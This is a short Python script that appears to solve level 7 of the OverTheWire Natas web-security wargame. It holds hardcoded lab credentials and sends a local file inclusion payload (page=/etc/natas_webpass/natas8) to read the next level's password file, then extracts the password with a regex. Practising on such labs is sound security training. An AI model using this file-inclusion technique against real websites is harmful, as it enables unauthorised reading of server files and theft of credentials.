import requests
import re #regular expression

username = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'

#url = 'http://%s.natas.labs.overthewire.org' % username
#url = 'http://%s.natas.labs.overthewire.org/index.php?page=home' % username

#LFI
url = 'http://%s.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8' % username


# auth = (user,pass) HTTP Basic Auth

reponse = requests.get(url, auth = (username, password))

content = reponse.text

#print(content)

print(re.findall('<br>\n(.*)\n\n', content)[0])
